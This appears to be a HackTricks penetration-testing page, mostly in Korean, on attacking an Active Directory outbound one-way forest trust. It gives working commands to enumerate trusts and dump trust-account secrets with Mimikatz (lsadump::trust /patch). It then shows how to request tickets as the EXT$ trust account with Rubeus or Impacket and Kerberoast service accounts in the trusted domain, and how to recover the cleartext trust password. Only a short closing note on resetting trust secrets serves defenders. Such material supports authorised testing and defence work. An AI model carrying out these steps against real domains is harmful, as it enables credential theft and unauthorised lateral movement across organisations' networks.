# External Forest Domain - One-Way (Outbound)

{{#include ../../banners/hacktricks-training.md}}

이 시나리오에서 **your domain**은 **different domain/forest**의 principal에게 일부 **privileges**를 **trusting**하고 있습니다.

## Enumeration

### Outbound Trust
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
AD module을 사용할 수 있다면, **Trusted Domain Object (TDO)**도 직접 inspect하세요. 이렇게 하면 나중에 쉬운 경로가 **FSP/group abuse**인지 **trust-account abuse**인지 판단할 때 필요한 raw LDAP-backed trust data를 얻을 수 있습니다:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
또한 `CN=ForeignSecurityPrincipals`의 foreign principal들이 실제로 어디에 access가 부여되었는지 열거해야 합니다. 흔한 성공 사례는:

- 현재 domain의 server/DC에서의 **Local admin**
- users/computers/GPOs에 대한 ACL을 가진 **custom domain group**의 membership
- **computer objects**를 수정할 수 있는 rights, 이는 trust configuration이 허용하면 나중에 [RBCD](resource-based-constrained-delegation.md)가 될 수 있음

## Trust Account Attack

domain/forest **B**에서 domain/forest **A**로 one-way trust가 생성될 때 (**B trusts A**), **B**에 대한 **trust account**가 **A**에 생성됩니다. **A**의 outbound-trust view에서 이는 유용한데, 나중에 **B**(trusting side)를 compromise하면 그 trust secret을 거기서 dump하고 `B$`로 **A**에 다시 authenticate할 수 있기 때문입니다.

여기서 이해해야 할 핵심은 해당 trust account의 password와 Kerberos material은 다음을 사용하여 **trusting** domain의 Domain Controller에서 추출할 수 있다는 점입니다:
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
이는 **trusted** 도메인에 생성된 trust account가 활성화된 principal이어서, 그곳의 일반 domain user와 같은 기본 권한을 가지게 되기 때문입니다. 이것만으로도 LDAP 열거를 시작하고, tickets를 요청하고, 다음 escalation path를 찾기에 충분한 경우가 많습니다.

`ext.local`이 **trusting** domain이고 `root.local`이 **trusted** domain인 시나리오에서는, `root.local` 내부에 `EXT$`라는 user account가 생성됩니다. `ext.local`에서 trust keys를 덤프하면 `root.local\EXT$`로 `root.local`에 대해 사용할 수 있는 credentials가 드러납니다:
```bash
lsadump::trust /patch
```
그런 다음, 추출한 **RC4** key를 사용해 `root.local\EXT$`로 `root.local` 내부에서 authenticate하십시오:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
그 principal로 trusted domain을 열거한 다음, 예를 들어 `root.local`에서 high-value SPN을 Kerberoasting하여:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Linux에서

**RC4** trust-account 키를 복구했다면, Impacket을 사용해 Linux에서도 같은 방식이 동작합니다:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
If **RC4**가 허용되지 않으면, 복구한 **cleartext password**(또는 파생된 **AES** keys)로 돌아가서 해당 foothold에서 일반적인 [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md)와 [Kerberoast](kerberoast.md) workflow를 재사용한다.

### Key material gotchas

**trust keys**와 **trust-account credentials**를 혼동하지 말 것:

- one-way trust에서는 양쪽 모두 **TDO**를 저장하지만, 실제 **`EXT$` user account는 trusted domain에만 존재**한다.
- 현재 trust-account password는 TDO trust secret(`NewPassword` / current trust key)에 반영된다.
- **RC4** trust key는 trust account로 `asktgt`에 재사용하기 가장 쉬운 artifact이다. 기본 설정에서는 trust account에 보통 비어 있는 `msDS-SupportedEncryptionTypes`가 있으므로, 대개 이것이 동작하는 enctype이다.
- **AES trust keys** 관점으로 생각한다면, salts가 다르기 때문에 trust-account AES keys와는 서로 호환되지 않는다는 점을 기억해야 한다.

따라서, 이 페이지의 technique에서는 덤프한 **RC4** material 또는 복구한 **cleartext** password를 우선 사용한다.

### Gathering cleartext trust password

이전 flow에서는 **cleartext password** 대신 trust hash를 사용했다(**mimikatz**에서도 덤프됨).

cleartext password는 mimikatz의 \[ CLEAR ] output을 hexadecimal에서 변환하고 null bytes `\x00`를 제거해서 얻을 수 있다:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be obtained by converting the ( CLEAR ) output from mimikatz from hexadecimal and removing null...](<../../images/image (938).png>)

trust relationship을 만들 때 사용자가 trust를 위해 password를 직접 입력해야 하는 경우도 있다. 이 demonstration에서는 key가 원래 trust password이므로 사람이 읽을 수 있다. key가 rotate되면(기본값: 30일마다) cleartext는 보통 더 이상 사람이 읽을 수 없게 되지만, 기술적으로는 여전히 사용할 수 있다.

cleartext password는 trust account로 일반 authentication을 수행하는 데 사용할 수 있으며, trust account의 Kerberos secret key로 TGT를 요청하는 것의 대안이다. 여기서는 `ext.local`에서 `root.local`의 `Domain Admins` 멤버를 조회한다:

![Trust Account Attack - Gathering cleartext trust password: The cleartext password can be used to perform regular authentication as the trust account, an alternative to requesting a TGT...](<../../images/image (792).png>)

### Practical limitations

> [!WARNING]
> Trust accounts는 다루기 까다로운 principal이다. **RUNAS / console / RDP** 같은 interactive logon은 여기서 기대되는 경로가 아니며, **NTLM** authentication 시도는 `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`로 실패할 수 있다. 대신 **Kerberos network logons**(`asktgt`, LDAP, CIFS, Kerberoast)을 계획하라.

### Persistence / cleanup note

방어자가 trusting domain이 compromised되었다는 사실을 알아차리면, `netdom trust ... /resetOneSide ...`로 양쪽의 trust secret을 모두 rotate해야 한다. 운영자 관점에서 중요한 점은, **manual reset은 기존 trust material을 즉시 무효화**한다는 것이고, 일반적인 trust-password rotation은 롤오버 동안 current/previous 값을 유지한다는 점이다.
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## References

- [https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
